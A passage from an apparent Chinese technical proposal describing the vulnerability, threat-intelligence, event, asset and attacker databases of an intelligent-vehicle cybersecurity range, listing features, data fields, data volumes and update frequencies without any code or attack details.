<li>支持已有测试数据中的漏洞导入。允许将已有的测试数据中发现的漏洞信息导入到漏洞库中进行管理和分析。将这些已有的测试数据中的漏洞导入到漏洞库中，可以充实漏洞库的内容，使其更为全面和详尽。通过导入已有的测试数据中的漏洞信息，可以使漏洞库进行更加丰富和完善；</li><li>支持专用漏洞库加密存储。将专用漏洞库中的数据进行加密，以确保漏洞信息的安全性和机密性。使用强大的加密算法和密钥管理机制，保护漏洞信息不被非法获取；</li><li>协助总结专用漏洞数不低于200个。通过协助专业团队进行测试和挖掘，发现200个漏洞，可以提高车辆系统的安全性，并为漏洞修复和风险管理提供充分的参考；</li></ol><h4 id="技术实现内容-13"><a href="#技术实现内容-13" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="靶场漏洞库方案"><a href="#靶场漏洞库方案" class="headerlink" title="靶场漏洞库方案"></a>靶场漏洞库方案</h5><p>漏洞收集：建立一个广泛的漏洞收集机制，包括对智能汽车相关组件、协议、应用程序等进行安全研究和漏洞挖掘，以获取最新的漏洞信息。可以通过安全研究人员、漏洞报告、公开漏洞数据库等渠道进行漏洞收集。标注出漏洞编号、漏洞名称、漏洞类型、影响级别、漏洞描述、修复建议、数据来源等信息等内容。</p><p>漏洞分类和归档：对收集到的漏洞进行分类和归档，建立一个结构化的漏洞库。可以按照漏洞的类型、影响程度、风险级别等进行分类，方便用户进行漏洞搜索和筛选。包括漏洞利用方式，如是否需要交互、是否需要进行认证、漏洞利用条件、漏洞触发方式、漏洞直接后果、漏洞影响范围等。</p><p>漏洞验证：对收集到的漏洞进行验证，确保漏洞的真实性和可复现性。可以建立一套漏洞验证流程和环境，通过模拟智能汽车的网络环境和攻击场景，验证漏洞的存在和影响。</p><p>漏洞描述和漏洞报告：对每个漏洞进行详细的描述和漏洞报告，包括漏洞的利用条件、攻击方式、影响范围、修复建议等信息。漏洞报告应该清晰、准确地描述漏洞的实际情况，方便用户理解和应对。</p><p>漏洞管理和更新：建立一个漏洞管理系统，对漏洞进行版本管理和更新。及时跟踪漏洞的修复情况和安全补丁的发布，确保漏洞库的及时更新和漏洞信息的准确性。</p><p>漏洞利用环境：为用户提供一个安全的漏洞利用环境，包括搭建合适的实验环境和提供相应的工具和资源。用户可以在这个环境中学习和实践漏洞利用技术，提高对智能汽车网络安全的理解和应对能力。</p><p><strong>漏洞信息内容</strong></p><p>将提供详细的漏洞信息，包括漏洞编号、漏洞名称、漏洞类型、影响级别、漏洞描述、修复建议、数据来源等信息。将确保漏洞信息的准确性和完整性。</p><p><strong>漏洞定性定级</strong></p><p>支持对漏洞进行定性定级，包括判断漏洞利用方式是否需要交互、是否需要进行认证、漏洞利用条件、漏洞触发方式、漏洞直接后果和漏洞影响范围等。这将更好地了解漏洞的严重程度和风险。</p><p><strong>漏洞优先级排序模型</strong></p><p>具备漏洞优先级排序功能，能够自动关联漏洞与利用情报、网关防御规则，进行漏洞的优先级排序。这将更好地管理和处理漏洞，确保关键风险得到及时处置。</p><p><strong>漏洞知识库</strong></p><p>包含了汽车网络和传统网络相关的漏洞信息，并支持第三方漏洞数据对接，如CVE、CNVD等漏洞信息。漏洞库条目整合了CVE、CNNVD、CNVD条目为一条，而非分开存放，漏洞条目数量超过9万条。</p><p><strong>漏洞更新频次</strong></p><p>支持自定义漏洞更新频次，可以按周、月等进行更新。对于重大漏洞情报，将及时更新，确保始终拥有最新的安全信息。</p><p><strong>靶场知识图谱关联</strong></p><p>支持与靶场知识图谱进行关联，进一步提升漏洞管理和处置的准确性和效率。</p><p><strong>汽车漏洞数量和专用漏洞协助</strong></p><p>初始数量已达到2000条汽车漏洞，并将协助根据现有测试数据、众测活动及漏洞提交平台审核通过的漏洞数据总结出至少200个专用漏洞。还支持已有测试数据中的漏洞导入，并提供专用漏洞库加密存储功能，确保数据的安全性。</p><h3 id="智能汽车网络靶场威胁情报库"><a href="#智能汽车网络靶场威胁情报库" class="headerlink" title="智能汽车网络靶场威胁情报库"></a>智能汽车网络靶场威胁情报库</h3><p>威胁情报库基于安全大数据能力，收集全球不同来源的汽车安全情报及网络安全情报数据，包括IP信誉、域名信誉、文件信誉、APT跟踪、历史活跃信息等。</p><h4 id="功能实施方案-14"><a href="#功能实施方案-14" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p><strong>失陷检测情报库</strong></p><ol><li>支持与威胁情报中心数据同步，内容包括APT攻击团伙、蠕虫木马、勒索软件、僵尸网络等相关的远程命令和控制服务器情报，用以发现被以上团伙控制的失陷资产。具备与威胁情报中心进行数据同步的能力，同步的信息涵盖了高级持续性威胁（APT）团伙、蠕虫木马、勒索软件以及僵尸网络等威胁类型的相关情报。这些情报包括远程命令和控制（C&amp;C）服务器的详细资料，它们是攻击者用来管理和指挥被感染的资产的服务器。通过这种情报同步，该系统能够有效地识别和确定那些可能已经落入上述攻击团伙控制之下的受损资产，从而采取适当的安全措施来应对和缓解威胁；</li><li>情报信息包含IP、域名、URL、SHA1、MD5等。录入内容字段应包括恶意类型、可信度、风险等级、威胁名称、情报来源、参考链接、威胁描述等。情报信息是指在网络安全领域中收集到的各种数据，包括IP地址、域名、URL、SHA1、MD5等。这些信息可以帮助及时发现并应对各种威胁。为了更好地管理这些情报信息，录入内容字段应包括多个方面的内容，如恶意类型、可信度、风险等级、威胁名称、情报来源、参考链接、威胁描述等。这些信息可以组织更好地评估威胁，制定防护措施，提高安全防御能力；</li><li>支持勒索、挖矿、蠕虫、僵尸网络、木马后门、APT攻击所控制系统，本地失陷主机情报数量1000万余条并且精准度达到95%。勒索、挖矿、蠕虫、僵尸网络、木马后门、APT攻击等各种威胁类型都是当前网络安全领域中的重点关注对象。为了更好地应对这些威胁，并分析相关情报信息，收集1000万余条本地失陷主机情报，并且其精准度达到了95%以上。这些情报信息可以帮助组织及时发现并应对各种威胁，提高安全防御能力。</li></ol><p><strong>APT情报：</strong></p><ol><li>支持显示APT组织团伙相关联数据，相关联数据包括： 团伙简介、团伙概述、技战法、APT情报、历史报告和数据可视化呈现。功能截图如下图所示。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/29110ef00c038b1852b248a8cf561f66.png"></p><ol><li>提供了支持标准Restful-API的APT档案库接口服务，通过这个接口服务，可以快速地访问和获取关于高级持续性威胁（APT）的相关信息，并依据相关威胁信息及时对现有防护措施加以改进。</li></ol><p><strong>文件信誉：</strong></p><ol><li>支持本地文件信誉库，包括文件的HASH信息（MD5、SHA1），支持研判文件样本是否恶意、恶意类型、攻击团伙、家族信息、样本名称、文件类型、文件样本大小、最早发现时间以及定向攻击等信息。该系统支持集成一个本地文件信誉数据库，其中包含了文件的HASH信息，如MD5和SHA1哈希。这个数据库使得系统能够对文件样本进行详细的安全评估，判断其是否具有恶意性质。除了基本的恶意判定，数据库还提供了丰富的相关信息，包括文件可能属于的恶意软件类型、与之相关联的攻击团伙、文件样本所属的家族、样本的名称、文件类型、文件样本大小、最初被发现的时间，以及该文件样本是否与定向攻击有关。这些综合信息的支持，极大增强了系统在安全防御方面的深度和广度，帮助安全团队更有效地识别、分析和应对潜在的安全威胁；</li><li>支持本地文件信誉热点库规模1000万余条。支持建立本地文件信誉热点库，其中包括了1000万以上的文件信息，通过这个信誉热点库，可以快速准确地评估文件样本的安全风险，并获取相关信息；</li><li>云端信誉库规模为200亿级，支持本地查询不到的数据可到云端信誉库进行查询后返回信息至本地，方便后期查询。提供了一个庞大的云端信誉库，规模不小于200亿级。这个云端信誉库包含了各种类型的文件样本信息，覆盖了广泛的威胁类型和攻击行为，对于本地查询无法找到的数据，可以通过我们的系统将查询请求发送至云端信誉库进行查询。云端信誉库拥有丰富的数据资源和强大的计算能力，可以帮助用户快速获取所需的信息，并将查询结果返回给本地，方便后期的查询和使用；</li></ol><p><strong>IP信誉库：</strong></p><ol><li>支持与威胁情报中心数据同步，提供IP的网络基础信息以及攻击历史信息，包括是否是网关、IDC服务器、个人主机、运营商出口、基站、VPN或代理等。支持与威胁情报中心进行数据同步，以获取最新的网络威胁情报，通过与威胁情报中心的数据同步，我们可以提供与IP地址相关的网络基础信息和攻击历史信息，包括该IP地址是否是网关、IDC服务器、个人主机、运营商出口、基站、VPN或代理等；</li><li>支持提供IP的地理位置包括归属国家或地区，精确到城市，归属地经纬坐标等。通过分析和处理大量的网络数据和地理信息数据，我们可以将IP地址映射到其所属的地理位置，返回该IP地址所属的国家或地区、精确到城市的位置信息，以及该位置的经纬度坐标等详细信息；</li><li>支持基于IP的情报来源、源IP、IP归属地、源IP端口、威胁类别、协议类型、攻击开始时间等维度进行IP查询，并提供相关的危害等级评估与IP的置信度建议。该系统提供了一个全面的IP情报查询功能，它允许用户根据多个关键维度进行详尽的搜索。这些维度包括情报来源、源IP地址、IP的地理归属地、源IP端口、威胁类别、使用的网络协议类型以及攻击的开始时间。基于这些数据，系统能够为每个查询到的IP地址提供一个风险评级，评估其潜在的危害程度。同时，系统还会给出一个关于该IP信誉的置信度建议，帮助用户理解情报的可靠性，并据此做出更为明智的安全决策。这样的功能对于迅速识别和响应网络安全事件至关重要，尤其是在处理复杂的安全威胁和攻击活动时；</li><li>本地IP信誉情报数量规模1000万余条。提供本地IP信誉情报数据库，其中包含1000万条的IP信誉情报数据，无论是检测恶意活动、防止网络攻击还是保护用户隐私，本地IP信誉情报数据库都提供了重要的支持。通过利用这个庞大的数据库，可以及时识别出潜在的威胁IP，并采取相应的安全措施来减少风险；</li></ol><p><strong>汽车威胁情报库：</strong></p><ol><li>提供汽车情报数据，不限于汽车漏洞情报、行业事件情报，漏洞包括第三方同步漏洞信息（CVE、CNVD等）、通过SRC平台以及检测工具平台挖掘的漏洞信息，事件情报包含不限于通过公网扫描的威胁事件及情报信息等。提供全面的汽车情报数据服务，涵盖了广泛的领域，包括汽车漏洞情报和行业事件情报。在汽车漏洞情报方面，不仅整合了第三方同步的漏洞信息（如CVE、CNVD等），还通过SRC平台和检测工具平台挖掘的漏洞信息进行收集和整理，收集和分析公网扫描所发现的威胁事件，并将其整合到汽车情报数据库中。这些威胁事件包括针对汽车系统的攻击、恶意代码传播和其他与汽车安全相关的活动；</li><li>支持漏洞利用情报，情报源包括全球权威的ExploitDB、Metasploit、CoreSecurity、PacketStorm、CxSecurity等，情报条目16万余条。系统集成了一个强大的漏洞利用情报库，该库汇集了来自全球权威源的漏洞信息，包括ExploitDB、Metasploit、CoreSecurity、PacketStorm和CxSecurity等。这个情报库覆盖了超过16万条记录，为安全分析师提供了一个广泛的数据集，以研究和了解最新的漏洞利用技术和趋势。通过这些情报，分析师可以快速识别系统中存在的安全漏洞，并采取措施来防范已知的攻击方法。这不仅增强了对现有威胁的响应能力，也提升了预防潜在安全事件的前瞻性；</li><li>提供的情报信息发布时间、发布厂商、通告类型、影响地域、影响行业、威胁等级、攻击者组织、攻击者类型、通告详情等。还提供了更加丰富、细致的情报内容，这些内容包括漏洞的技术细节及可能的危害、利用漏洞的攻击方式和工具、防御措施和修复建议，以及安全事件跟踪和分析等。通过提供全面、准确的情报信息，帮助更好地了解漏洞利用的威胁，并采取有效的安全措施来保护自身的系统和数据；</li></ol><p><strong>更新频次：</strong></p><ol><li>有互联网情况下，可以在线升级，情报库以小时级升级。提供在线升级的方式，确保可以随时获取最新的情报信息。同时，将情报库的更新频率设定为每小时一次，确保可以及时了解和应对最新的漏洞利用风险；</li><li>在隔离网情况下，支持离线导入升级包方式升级，情报以天或周的频次升级。对于处于隔离网环境的情况，提供了离线导入升级包的方式来进行情报库的更新。可以将最新的升级包下载到本地，然后通过离线导入的方式进行升级，确保能够获取最新的情报信息。情报库的更新频率设定为每天或每周一次。这样的更新频次可以满足在隔离网环境中的需求，并确保可以及时了解最新的漏洞利用风险；</li><li>支持非结构化情报导入，格式docx、pdf、txt等，可以将各种形式的情报信息导入情报库中，并进行有效的管理和分析，对于非结构化情报，采用先进的文本处理技术，将其转化为结构化数据，以便更好地进行分析和应用。支持多种语言的文本处理，并具有良好的兼容性和稳定性，可以满足在各种情景下的需求；</li></ol><h4 id="技术实现内容-14"><a href="#技术实现内容-14" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="靶场威胁情报库方案"><a href="#靶场威胁情报库方案" class="headerlink" title="靶场威胁情报库方案"></a>靶场威胁情报库方案</h5><p>威胁情报收集：建立一个广泛的威胁情报收集机制，包括监测和收集来自各种渠道的威胁情报数据，如公开威胁情报源、黑客论坛、漏洞报告、安全研究报告等。能与威胁情报中心数据同步，内容包括APT攻击团伙、蠕虫木马、勒索软件、僵尸网络等相关的远程命令和控制服务器情报，用以发现被以上团伙控制的失陷资产，可以利用自动化工具和人工情报分析的方式，及时获取最新的威胁情报。</p><p>威胁情报分类和归档：对收集到的威胁情报进行分类和归档，建立一个结构化的威胁情报库。情报信息包含IP、域名、URL、SHA1、MD5等。录入内容字段应包括恶意类型、可信度、风险等级、威胁名称、情报来源、参考链接、威胁描述等。可以按照威胁类型、攻击方式、攻击目标等进行分类，方便用户进行威胁情报的搜索和筛选。</p><p>威胁情报分析和评估：对收集到的威胁情报进行分析和评估，可分析出勒索、挖矿、蠕虫、僵尸网络、木马后门、APT攻击所控制系统，本地失陷主机情报数量1000万余条并且精准度达到95%，确定其对智能汽车网络的威胁程度和潜在影响。可以利用威胁情报分析工具和技术，对威胁情报进行关联分析、威胁评估和风险评估，为用户提供准确的威胁情报信息。</p><p>威胁情报共享和交流：建立一个威胁情报共享平台，促进用户之间的威胁情报交流和共享。用户可以在平台上分享自己的威胁情报分析结果和经验，获取其他用户的反馈和建议，提高对智能汽车网络威胁的认识和应对能力。</p><p>威胁情报更新和通知：及时跟踪和更新威胁情报库中的数据，确保威胁情报的准确性和时效性。可以通过定期的更新机制和通知机制，向用户提供最新的威胁情报信息，帮助用户及时了解和应对新出现的威胁。</p><p>威胁情报可视化和报告：提供威胁情报可视化的功能，以图表、图形等形式展示威胁情报的统计数据和趋势分析。同时，生成详细的威胁情报报告，包括威胁分析结果、威胁评估、风险建议等，帮助用户更好地理解和应对威胁情报。</p><p><strong>失陷检测情报库</strong></p><p>在失陷检测情报库中，可完成与威胁情报中心数据同步，包括APT攻击团伙、蠕虫木马、勒索软件、僵尸网络等相关的远程命令和控制服务器情报，以上情报可用以发现被以上团伙控制的失陷资产。</p><p>其中情报信息包含IP、域名、URL、SHA1、MD5等，并能提供恶意类型、可信度、风险等级、威胁名称、情报来源、参考链接、威胁描述等字段。</p><p>在威胁情报库中，具有勒索、挖矿、蠕虫、僵尸网络、木马后门、APT攻击所控制系统，本地失陷主机情报数量1000万余条，并且精准度达到95%。</p><p><strong>APT情报</strong></p><p>在APT情报中可通过通过标准Restful-API提供APT档案库接口服务，也能够显示与APT组织团伙相关联的数据，我们包括了 团伙简介、团伙概述、技战法、APT情报、历史报告和数据可视化呈现。</p><p><strong>文件信誉</strong></p><p>建立了本地文件信誉库，包括文件的HASH信息（MD5、SHA1），通过该信誉库可以研判文件样本是否恶意、恶意类型、攻击团伙、家族信息、样本名称、文件类型、文件样本大小、最早发现时间以及定向攻击等信息。信誉热点库规模1000万余条，同时云端信誉库规模在200亿级，可满足在本地查询不到的数据时，可到云端信誉库进行查询后返回信息至本地，方便后期查询。</p><p><strong>IP信誉库</strong></p><p>IP信誉库不仅能与威胁情报中心数据同步，提供IP的网络基础信息以及攻击历史信息，这些信息中可直观看出是否是网关、IDC服务器、个人主机、运营商出口、基站、VPN或代理等。还能提供IP的地理位置，包括归属国家或地区，精确到城市，归属地经纬坐标等。</p><p>同时还可以基于IP的情报来源、源IP、IP归属地、源IP端口、威胁类别、协议类型、攻击开始时间等维度进行IP查询，并提供相关的危害等级评估与IP的置信度建议。</p><p><strong>汽车威胁情报库</strong></p><p>汽车威胁情报库不仅能提供汽车情报数据，包括汽车漏洞情报、行业事件情报。其中的漏洞信息不限于第三方同步漏洞信息（CVE、CNVD等），还包括通过SRC平台以及检测工具平台挖掘的漏洞信息（事件情报包含不限于通过公网扫描的威胁事件及情报信息等）。</p><p>同时汽车威胁情报库能使用漏洞利用情报，情报源包括全球权威的ExploitDB、Metasploit、CoreSecurity、PacketStorm、CxSecurity等，情报条目数量16万余条。情报信息包括发布时间、发布厂商、通告类型、影响地域、影响行业、威胁等级、攻击者组织、攻击者类型、通告详情等。</p><p><strong>更新频次</strong></p><p>更新频次满足三种情况，一是可以在互联网情况下进行在线升级，情报库以小时级进行更新。二是在隔离网情况下，进行离线导入升级包方式进行升级，情报以天或周的频次进行更新。此外，还可通过非结构化情报的导入，格式包括docx、pdf、txt等。</p><h3 id="智能汽车网络靶场事件库"><a href="#智能汽车网络靶场事件库" class="headerlink" title="智能汽车网络靶场事件库"></a>智能汽车网络靶场事件库</h3><p>事件库是安全分析的基础，通过资产告警日志、网络安全设备日志、安全告警等数据以及相关网络攻击行为、网络访问行为等安全事件的汇总。事件库用于存储处于汽车网络安全各个环节的事件信息，便于全面了解和掌握安全事件的情况和工作进展。</p><h4 id="功能实施方案-15"><a href="#功能实施方案-15" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>提供的事件库内容十分丰富，包括事件ID、事件时间、事件名称、事件基础信息、事件详情、事件分类等各种信息和参考数据。还提供了对于网络安全事件处置中的流程信息，包括响应策略、处理步骤、责任人员等，以帮助更加有效地应对安全事件。在事件库中，可以查找各种类型的事件信息，包括已知的漏洞利用活动、恶意软件攻击、网络诈骗等，并了解其相关的情报信息和处置建议；</li><li>云端发布的事件通报支持多种升级方式将通报内容同步到用户的本地平台。通报内容包括发布时间、发布厂商、报告名称、通告类型、影响区域、威胁等级、影响行业、攻击者类型、攻击者组织、参考链接、标签等详细信息，为用户提供全面的情报数据，可以选择将安全通告以PDF的形式进行导出，方便离线阅读和共享。用户可以随时随地查看通告内容，并与团队成员或合作伙伴进行共享和讨论，以便更好地应对安全威胁和风险；</li><li>支持重大行业及网络安全事件及时更新，平时事件库根据靶场信息、行业信息等频次更新。网络安全事件的发生频率非常高，因此事件库需要及时更新，以确保可以获取到最新的安全情报信息。平时的事件库根据靶场信息、行业信息等多个方面进行事件库的频次更新。通过平时的事件库更新，帮助用户了解当前的安全态势，及时察觉潜在的威胁和风险，并采取相应的措施加强安全防护。</li></ol><h4 id="技术实现内容-15"><a href="#技术实现内容-15" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="靶场事件库方案"><a href="#靶场事件库方案" class="headerlink" title="靶场事件库方案"></a>靶场事件库方案</h5><p>事件收集：建立一个事件收集机制，监测和收集智能汽车网络领域的安全事件。事件ID、事件时间、事件名称、事件基础信息、事件详情、事件分类等各种信息和参考数据，以及对于网络安全事件处置中的流程信息等。可以通过订阅安全新闻、跟踪公开事件报告、关注安全研究机构的发布等方式获取最新的事件信息。</p><p>事件分类和归档：对收集到的事件进行分类和归档，建立一个结构化的事件库。云端发布的事件通报支持通过多种升级方式同步到用户本地平台，通报内容包括发布时间、发布厂商、报告名称、通告类型、影响区域、威胁等级、影响行业、攻击者类型、攻击者组织、参考链接、标签等信息，支持安全通告通过PDF方式进行导出。可以按照事件类型、漏洞利用方式、受影响的智能汽车品牌或型号等进行分类，方便用户进行事件搜索和筛选。</p><p>事件描述和分析：对每个事件进行详细的描述和分析，包括事件的发生时间、受影响的组件或系统、攻击方式、影响程度等信息。可以对事件进行溯源分析、攻击路径分析和影响评估，为用户提供深入的事件理解和分析结果。</p><p>事件响应和处置建议：针对每个事件提供相应的响应和处置建议，包括修复措施、漏洞补丁、安全配置建议等。用户可以根据事件库中的信息，及时采取相应的措施，降低智能汽车网络安全风险。</p><p>事件管理和更新：建立一个事件管理系统，对事件进行版本管理和更新。及时跟踪事件的解决情况和相关安全公告，确保事件库的及时更新和事件信息的准确性。重大行业及网络安全事件应及时更新，平时事件库根据靶场信息、行业信息等频次更新。</p><p>用户反馈和贡献：鼓励用户积极参与事件库的建设和完善，接受用户的反馈和事件报告，并及时进行处理和更新。可以建立一个用户社区或者论坛，促进用户之间的交流和共享。</p><p>事件可视化和报告：提供事件可视化的功能，以图表、图形等形式展示事件的统计数据和趋势分析。同时，生成详细的事件报告，包括事件分析结果、响应建议、安全建议等，帮助用户更好地理解和应对事件。</p><p><strong>事件库内容</strong></p><p>事件库包括事件ID、事件时间、事件名称、事件基础信息、事件详情、事件分类等各种信息和参考数据。此外，还提供对于网络安全事件处置中的流程信息等。这些信息将帮助全面了解和掌握安全事件的情况和工作进展。</p><p><strong>云端发布的事件通报</strong></p><p>支持将云端发布的事件通报通过多种升级方式同步到用户本地平台。事件通报包括发布时间、发布厂商、报告名称、通告类型、影响区域、威胁等级、影响行业、攻击者类型、攻击者组织、参考链接、标签等信息。此外，还支持安全通告通过PDF方式进行导出，以方便的使用和分享。</p><p><strong>重大行业及网络安全事件更新</strong></p><p>了解重大行业及网络安全事件的及时更新对于的安全分析工作至关重要。因此，承诺根据靶场信息、行业信息等频次进行事件库的更新，以确保始终掌握最新的安全事件信息。</p><h3 id="智能汽车网络靶场资产库"><a href="#智能汽车网络靶场资产库" class="headerlink" title="智能汽车网络靶场资产库"></a>智能汽车网络靶场资产库</h3><p>资产库是对于汽车安全靶场系统的资产进行管理的基础信息库。</p><h4 id="功能实施方案-16"><a href="#功能实施方案-16" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>支持从大数据平台抓取资产数据，并将其进行汇总和整理。在车辆资产数据方面，包括收集车型ID，还包括入库车辆总数、注册车辆总数、在线车辆总数以及最后修改时间等关键信息。通过对这些数据的分析，能够全面了解车辆资产的状况和变化趋势，提供准确的资产管理和决策支持。无论是监控车辆状态、统计车辆数量，还是进行资产调配和规划，都能提供可靠的数据基础，并帮助用户实现更高效的车辆资产管理；</li><li>支持从检测平台、SRC平台、靶场平台对接零部件设备数据，设备基本信息包括设备型号、设备厂家、所含资产及资产信息（芯片、协议、操作系统等）。通过与这些平台的对接，能够获取实时的设备数据，并将其整合汇总。这使得用户可以方便地了解每个设备的具体规格和技术参数，同时还能获取设备所含资产的详细信息；</li><li>支持通过录入形式导入车辆及零部件资产信息，车辆信息包括车辆VIN码、车型ID、配置等级、设备（包括TBOX、车机等）序列号，设备信息包括设备（包括TBOX、车机等）序列号、设备型号、设备供应商、系统信息、版本信息。这样的录入方式使用户能够完整地记录和管理车辆及零部件的资产信息，通过这种方式，用户可以轻松地将现有的车辆和零部件资产信息导入到系统中，并进行集中化的管理和跟踪。这样一来，可以更方便地查找和识别特定的车辆和设备，了解其具体的型号、供应商和版本等关键信息。</li></ol><h4 id="技术实现内容-16"><a href="#技术实现内容-16" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="靶场资产库方案"><a href="#靶场资产库方案" class="headerlink" title="靶场资产库方案"></a>靶场资产库方案</h5><p>资产收集：建立一个资产收集机制，获取智能汽车网络中的各类资产信息，包括车辆型号、软件版本、网络架构、通信协议等。从大数据平台抓取资产数据并进行汇总，车辆资产数据不限于车型ID、入库车辆总数、注册车辆总数、在线车辆总数、最后修改时间。可以通过扫描工具、API接口、车辆厂商提供的数据等方式获取资产信息。</p><p>资产分类和归档：对收集到的资产信息进行分类和归档，建立一个结构化的资产库。从检测平台、SRC平台、靶场平台对接零部件设备数据，设备基本信息包括设备型号、设备厂家、所含资产及资产信息（芯片、协议、操作系统等）。可以按照车辆品牌、型号、软件版本等进行分类，方便用户进行资产搜索和筛选。</p><p>资产描述和分析：对每个资产进行详细的描述和分析，包括车辆的硬件组成、软件架构、网络连接方式等信息。通过录入形式导入车辆及零部件资产信息，车辆信息包括：车辆VIN码、车型ID、配置等级、设备（包括TBOX、车机等）序列号，设备信息包括设备（包括TBOX、车机等）序列号、设备型号、设备供应商、系统信息、版本信息。可以对资产进行安全评估和风险分析，为用户提供对资产的全面了解和分析结果。</p><p>资产漏洞和安全配置：记录每个资产的已知漏洞和安全配置信息。可以收集公开的漏洞报告、安全公告以及厂商提供的安全建议，为用户提供及时的漏洞和安全配置信息。</p><p>资产管理和更新：建立一个资产管理系统，对资产信息进行版本管理和更新。及时跟踪车辆厂商的软件更新、补丁发布等，确保资产库的及时更新和资产信息的准确性。</p><p>用户反馈和贡献：鼓励用户积极参与资产库的建设和完善，接受用户的反馈和资产信息报告，并及时进行处理和更新。可以建立一个用户社区或者论坛，促进用户之间的交流和共享。</p><p>资产可视化和报告：提供资产可视化的功能，以图表、图形等形式展示资产的统计数据和分布情况。同时，生成详细的资产报告，包括资产分析结果、漏洞和安全配置建议等，帮助用户更好地理解和管理资产。</p><p><strong>资产数据汇总</strong></p><p>支持从大数据平台抓取资产数据并进行汇总。车辆资产数据包括车型ID、入库车辆总数、注册车辆总数、在线车辆总数、最后修改时间等信息。这些数据将帮助全面了解车辆资产的情况和状态。</p><p><strong>零部件设备数据对接</strong></p><p>支持与检测平台、SRC平台、靶场平台对接，以获取零部件设备的基本信息。设备基本信息包括设备型号、设备厂家、所含资产及资产信息（芯片、协议、操作系统等）。通过与这些平台的对接，可以获取更全面的设备信息并进行管理。</p><p><strong>录入形式导入资产信息</strong></p><p>除了从平台抓取数据外，还支持通过录入形式导入车辆及零部件资产信息。车辆信息包括车辆VIN码、车型ID、配置等级、设备（包括TBOX、车机等）序列号等。设备信息包括设备（包括TBOX、车机等）序列号、设备型号、设备供应商、系统信息、版本信息等。这样，可以方便地录入和管理自有资产信息。</p><h3 id="智能汽车网络靶场攻击者库"><a href="#智能汽车网络靶场攻击者库" class="headerlink" title="智能汽车网络靶场攻击者库"></a>智能汽车网络靶场攻击者库</h3><p>攻击者/组织库是汽车靶场从攻击者视角评估风险的基础。</p><h4 id="功能实施方案-17"><a href="#功能实施方案-17" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>支持从威胁情报数据中获取已知APT攻击团伙的基础信息库，包括可能的国家、影响地区、攻击目的、历史攻击事件、攻击技战术手法等信息。通过获取这些信息，用户可以更好地了解已知的APT攻击团伙的行为模式和特征。可以了解到这些团伙可能来自哪个国家，对哪些地区有较大的影响力，以及他们的攻击目的是什么，可以查看这些团伙过去的攻击事件，了解他们使用的攻击方式和手段；</li><li>支持显示APT团伙的常用的基础设施，包括：C2、样本HASH、IP、Domain、URL等。通过显示APT团伙的C2服务器信息，可以了解到这些团伙在攻击中使用的指挥与控制服务器的位置和特征。同时，还可以识别出与这些团伙相关的恶意软件样本，通过样本的哈希值进行比对和监测，还可以查看APT团伙使用的IP地址、域名和URL等信息，显示这些基础设施信息，提供给用户一个全面的视角来了解APT团伙的攻击行为和攻击基础设施；</li><li>支持显示APT团伙技战法归纳，显示相应团伙常用的攻击手法等信息。通过技战法归纳，将不同APT团伙使用的攻击手法进行分类和总结，显示APT团伙常用的攻击手法方面，可以提供详细的信息，例如网络钓鱼、恶意软件传播、漏洞利用、社会工程等等。可以了解到这些团伙的攻击偏好和专长领域，有针对性地加强自身在这些方面的安全措施；</li><li>支持同步靶场记录的攻击者信息数据及攻击行为等数据。通过同步靶场记录的攻击者信息数据，可以获得攻击者的关键信息，例如攻击者的IP地址、使用的恶意软件类型、攻击的目标等等。这些信息可以帮助用户追踪和识别攻击者，进一步了解他们的意图和行为。提供攻击行为数据，包括攻击流量、攻击方法、攻击目的等等。这些数据可以帮助用户深入分析攻击者的策略和手段，从而更好地预测和防范类似的攻击。</li></ol><h4 id="技术实现内容-17"><a href="#技术实现内容-17" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="靶场攻击者库方案"><a href="#靶场攻击者库方案" class="headerlink" title="靶场攻击者库方案"></a>靶场攻击者库方案</h5><p>攻击者信息收集：建立一个攻击者信息收集机制，获取智能汽车网络领域的攻击者相关信息，包括攻击者的行为模式、攻击工具、攻击技术等。从威胁情报数据中获取已知APT攻击团伙的基础信息库，包括可能的国家、影响地区、攻击目的、历史攻击事件、攻击技战术手法等信息。可以通过监测黑客论坛、研究报告、安全威胁情报等渠道获取攻击者信息。</p><p>攻击者分类和归档：对收集到的攻击者信息进行分类和归档，建立一个结构化的攻击者库。显示APT团伙的常用的基础设施，包括：C2、样本HASH、IP、Domain、URL等。可以按照攻击者类型、攻击手段、攻击目标等进行分类，方便用户进行攻击者搜索和筛选。</p><p>攻击者描述和分析：对每个攻击者进行详细的描述和分析，包括攻击者的特征、攻击方法、攻击目的等信息。可以对攻击者进行行为分析、攻击路径分析和威胁评估，为用户提供深入的攻击者了解和分析结果。</p><p>攻击者模拟环境：建立一个攻击者模拟环境，用于模拟和重现智能汽车网络中的攻击行为。显示APT团伙技战法归纳，显示相应团伙常用的攻击手法等信息。可以搭建虚拟网络环境、使用合适的攻击工具和技术，模拟不同类型的攻击者行为，帮助用户了解攻击者的攻击方式和效果。</p><p>攻击者管理和更新：建立一个攻击者管理系统，对攻击者信息进行版本管理和更新。同步靶场记录的攻击者信息数据及攻击行为等数据。及时跟踪攻击者的新攻击技术、工具更新等，确保攻击者库的及时更新和攻击者信息的准确性。</p><p>用户反馈和贡献：鼓励用户积极参与攻击者库的建设和完善，接受用户的反馈和攻击者信息报告，并及时进行处理和更新。可以建立一个用户社区或者论坛，促进用户之间的交流和共享。</p><p>攻击者可视化和报告：提供攻击者可视化的功能，以图表、图形等形式展示攻击者的统计数据和趋势分析。同时，生成详细的攻击者报告，包括攻击者分析结果、防御建议等，帮助用户更好地理解和应对攻击者。</p><p><strong>威胁情报数据获取</strong></p><p>支持从威胁情报数据中获取已知APT攻击团伙的基础信息库。这些信息包括可能的国家、影响地区、攻击目的、历史攻击事件、攻击技战术手法等。通过这些信息，可以了解不同攻击团伙的特征和行为，从而评估风险和采取相应的防护措施。</p><p><strong>APT团伙基础设施显示</strong></p><p>支持显示APT团伙的常用基础设施，包括C2（命令与控制）服务器、样本HASH、IP、Domain、URL等。这些信息将帮助追踪和监测